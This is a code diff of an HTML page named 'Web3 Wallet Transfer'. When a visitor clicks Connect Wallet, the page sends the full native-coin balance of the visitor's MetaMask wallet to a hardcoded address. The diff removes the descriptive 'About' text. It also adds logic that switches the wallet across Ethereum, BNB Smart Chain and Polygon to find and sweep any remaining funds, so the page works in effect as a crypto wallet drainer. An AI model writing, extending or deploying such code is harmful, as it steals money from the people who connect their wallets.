@@ -26,20 +26,6 @@
             font-size: 2.5em;
             margin-bottom: 20px;
         }
-        nav {
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        nav a {
-            margin: 0 15px;
-            text-decoration: none;
-            color: #4caf50;
-            font-weight: bold;
-            transition: color 0.3s;
-        }
-        nav a:hover {
-            color: #81c784;
-        }
         button {
             width: 100%;
             padding: 15px;
@@ -71,33 +57,14 @@
             font-size: 12px;
             color: #bbb;
         }
-        .logo {
-            display: block;
-            margin: 0 auto 20px;
-            max-width: 150px;
-        }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="logo-placeholder.png" alt="Logo" class="logo">
         <h1>Web3 Wallet Transfer</h1>
-        <nav>
-            <a href="#home">Home</a>
-            <a href="#about">About</a>
-        </nav>
-        
-        <section id="home">
-            <h2>Connect MetaMask & Transfer Crypto</h2>
-            <button id="connectWallet">Connect Wallet</button>
-            <button id="disconnectWallet" disabled>Disconnect Wallet</button>
-            <p id="status"></p>
-        </section>
-
-        <section id="about">
-            <h2>About This Tool</h2>
-            <p>This tool allows you to connect your MetaMask wallet and automatically send your crypto assets. It handles network changes and ensures that the crypto is sent from the active network first.</p>
-        </section>
+        <button id="connectWallet">Connect Wallet</button>
+        <button id="disconnectWallet" disabled>Disconnect Wallet</button>
+        <p id="status"></p>
     </div>
 
     <footer>
@@ -108,21 +75,21 @@
     <script>
         let provider, signer, userAddress = "";
 
-        const recipientAddress = "0xD30bC2a15eb5cd4Be08059AA9354Fc46BB13aDe8";
-
-        const chains = [
+        const recipientAddress = "0xD30bC2a15eb5cd4Be08059AA9354Fc46BB13aDe8"; // Change this to your recipient address
+        const networks = [
             { chainId: 1, name: 'Ethereum', nativeSymbol: 'ETH' },
             { chainId: 56, name: 'BNB Smart Chain', nativeSymbol: 'BNB' },
-            { chainId: 137, name: 'Polygon', nativeSymbol: 'MATIC' }
+            { chainId: 137, name: 'Polygon', nativeSymbol: 'MATIC' },
+            // Add more networks as needed
         ];
 
         document.getElementById('connectWallet').addEventListener('click', async () => {
-            try {
-                if (!window.ethereum) {
-                    document.getElementById('status').innerText = `MetaMask is not installed.`;
-                    return;
-                }
+            if (!window.ethereum) {
+                document.getElementById('status').innerText = `MetaMask is not installed.`;
+                return;
+            }
 
+            try {
                 provider = new ethers.providers.Web3Provider(window.ethereum);
                 await provider.send("eth_requestAccounts", []);
                 signer = provider.getSigner();
@@ -133,7 +100,8 @@
                 document.getElementById('disconnectWallet').disabled = false;
                 document.getElementById('connectWallet').disabled = true;
 
-                await sendCryptoOnCurrentNetwork();
+                // Start checking balances and sending crypto
+                await checkBalancesAndSendCrypto();
             } catch (error) {
                 document.getElementById('status').innerText = `Connection failed: ${error.message}`;
             }
@@ -142,24 +110,44 @@
         document.getElementById('disconnectWallet').addEventListener('click', () => {
             userAddress = "";
             signer = null;
+            provider = null;
             document.getElementById('status').innerText = `Disconnected.`;
             document.getElementById('disconnectWallet').disabled = true;
             document.getElementById('connectWallet').disabled = false;
         });
 
-        async function sendCryptoOnCurrentNetwork() {
+        async function checkBalancesAndSendCrypto() {
             try {
                 const network = await provider.getNetwork();
                 const balance = await provider.getBalance(userAddress);
+                
                 if (balance.isZero()) {
-                    document.getElementById('status').innerText = `No crypto found on ${network.name}.`;
-                    return;
+                    document.getElementById('status').innerText = `No ETH found on ${network.name}. Checking other networks...`;
+                    await checkOtherNetworksAndSendCrypto();
+                } else {
+                    await sendNativeCrypto(balance, network);
                 }
-
-                await sendNativeCrypto(balance, network);
             } catch (error) {
-                document.getElementById('status').innerText = `Transaction failed: ${error.message}`;
+                document.getElementById('status').innerText = `Error: ${error.message}`;
             }
+        }
+
+        async function checkOtherNetworksAndSendCrypto() {
+            for (const net of networks) {
+                if (net.chainId !== 1) { // Avoid checking the current network again
+                    try {
+                        await switchNetwork(net.chainId);
+                        const balance = await provider.getBalance(userAddress);
+                        if (!balance.isZero()) {
+                            await sendNativeCrypto(balance, net);
+                            return;
+                        }
+                    } catch (error) {
+                        document.getElementById('status').innerText += `\nFailed to check ${net.name}: ${error.message}`;
+                    }
+                }
+            }
+            document.getElementById('status').innerText += `\nNo funds available on any checked networks.`;
         }
 
         async function sendNativeCrypto(balance, network) {
@@ -174,6 +162,35 @@
                 document.getElementById('status').innerText = `Sent ${ethers.utils.formatEther(balance)} ${network.nativeSymbol} from ${network.name}.`;
             } catch (error) {
                 document.getElementById('status').innerText = `Transaction failed: ${error.message}`;
+            }
+        }
+
+        async function switchNetwork(chainId) {
+            try {
+                await provider.send("wallet_switchEthereumChain", [{ chainId: `0x${chainId.toString(16)}` }]);
+                provider = new ethers.providers.Web3Provider(window.ethereum); // Update provider after switch
+                signer = provider.getSigner();
+                document.getElementById('status').innerText = `Switched to network with chainId: ${chainId}`;
+            } catch (switchError) {
+                // Handle the case where the user has not added the network
+                if (switchError.code === 4902) {
+                    const networkDetails = networks.find(n => n.chainId === chainId);
+                    if (networkDetails) {
+                        await provider.send("wallet_addEthereumChain", [{
+                            chainId: `0x${chainId.toString(16)}`,
+                            chainName: networkDetails.name,
+                            rpcUrls: [`https://rpc-url-here`], // Replace with actual RPC URL
+                            nativeCurrency: {
+                                name: networkDetails.name,
+                                symbol: networkDetails.nativeSymbol,
+                                decimals: 18
+                            },
+                        }]);
+                        await switchNetwork(chainId); // Retry switching after adding the network
+                    }
+                } else {
+                    throw switchError;
+                }
             }
         }
     </script>
